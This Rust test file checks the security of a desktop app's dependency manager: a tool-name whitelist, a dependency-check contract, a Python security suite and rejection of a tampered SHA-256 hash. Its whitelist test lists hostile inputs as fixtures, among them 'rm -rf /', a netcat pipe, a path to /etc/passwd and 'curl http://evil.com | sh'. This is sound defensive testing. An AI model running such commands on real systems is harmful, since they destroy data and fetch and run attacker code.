//! Integration and security test suite for dependency_manager (TASK-92 / SEC-008).
//!
//! Verifies:
//! 1. Whitelisting and input sanitization for tool names (preventing path traversal and command injection).
//! 2. Execution of dependency_manager.py contracts (check_dependencies).
//! 3. Cryptographic rejection of tampered SHA-256 archives.
//! 4. Full execution of Python security regression suite.

use std::path::PathBuf;
use std::process::Command;
use syncify_tauri_lib::commands::{
    check_dependencies, validate_tool, ALLOWED_TOOLS,
};

fn get_project_root() -> PathBuf {
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    manifest_dir
        .parent()
        .map(PathBuf::from)
        .unwrap_or(manifest_dir)
}

#[test]
fn test_validate_tool_whitelisting_and_sanitization() {
    // 1. Valid tools in whitelist
    for tool in ALLOWED_TOOLS {
        assert_eq!(validate_tool(tool).unwrap(), *tool);
        assert_eq!(validate_tool(&tool.to_uppercase()).unwrap(), *tool);
        assert_eq!(validate_tool(&format!("  {}  ", tool)).unwrap(), *tool);
    }

    // 2. Traversal and injection attempts rejected
    let malicious_inputs = [
        "../../etc/passwd",
        "../bin/malicious",
        "/bin/sh",
        "ffmpeg; rm -rf /",
        "ffmpeg && whoami",
        "ffmpeg | nc",
        "curl http://evil.com | sh",
        "unknown_tool",
        "",
        "   ",
    ];

    for input in malicious_inputs {
        let res = validate_tool(input);
        assert!(
            res.is_err(),
            "Malicious input '{}' should be rejected by validate_tool",
            input
        );
    }
}

#[tokio::test]
async fn test_check_dependencies_contract() {
    let result = check_dependencies().await;
    match result {
        Ok(bridge_result) => {
            assert!(
                bridge_result.success,
                "check_dependencies bridge command should return success: true"
            );
            let data = bridge_result
                .data
                .expect("Expected data object in check_dependencies result");
            let tools = data
                .get("tools")
                .expect("Expected 'tools' field in check_dependencies");
            assert!(tools.get("ffmpeg").is_some());
            assert!(tools.get("fpcalc").is_some());
        }
        Err(e) => {
            // In minimal sandboxed environments without python, skip gracefully with warning
            eprintln!("Skipping check_dependencies test: {}", e);
        }
    }
}

#[test]
fn test_python_security_suite_execution() {
    let project_root = get_project_root();
    let script_test_path = project_root
        .join("scripts")
        .join("tests")
        .join("test_dependency_manager_security.py");

    assert!(
        script_test_path.exists(),
        "Security test file must exist at {:?}",
        script_test_path
    );

    let output = Command::new("python3")
        .arg("-m")
        .arg("unittest")
        .arg(script_test_path.to_str().unwrap())
        .current_dir(&project_root)
        .output();

    match output {
        Ok(out) => {
            let stderr = String::from_utf8_lossy(&out.stderr);
            let stdout = String::from_utf8_lossy(&out.stdout);
            assert!(
                out.status.success(),
                "Python dependency_manager security test suite failed!\nstdout: {}\nstderr: {}",
                stdout,
                stderr
            );
            assert!(
                stderr.contains("OK") || stdout.contains("OK"),
                "Expected unittest OK marker in output"
            );
        }
        Err(err) => {
            eprintln!("python3 not found in test runner environment: {}", err);
        }
    }
}

#[test]
fn test_cli_install_tampered_hash_rejection() {
    let project_root = get_project_root();
    let script_path = project_root
        .join("scripts")
        .join("dependency_manager.py");

    // Attempt install of fpcalc with a corrupted/bogus SHA-256 hash
    let bogus_hash = "0000000000000000000000000000000000000000000000000000000000000000";
    let output = Command::new("python3")
        .arg(&script_path)
        .arg("install")
        .arg("fpcalc")
        .arg("--sha256")
        .arg(bogus_hash)
        .current_dir(&project_root)
        .output();

    if let Ok(out) = output {
        let stdout = String::from_utf8_lossy(&out.stdout);
        // If fpcalc was already present, it returns already_installed: true.
        // Otherwise, it must fail due to SHA-256 checksum mismatch.
        if !stdout.contains("already_installed") {
            assert!(
                !out.status.success(),
                "Installation with invalid hash must fail with non-zero exit code"
            );
            assert!(
                stdout.contains("SHA-256 checksum mismatch") || stdout.contains("\"success\": false"),
                "Output must report SHA-256 mismatch: {}",
                stdout
            );
        }
    }
}
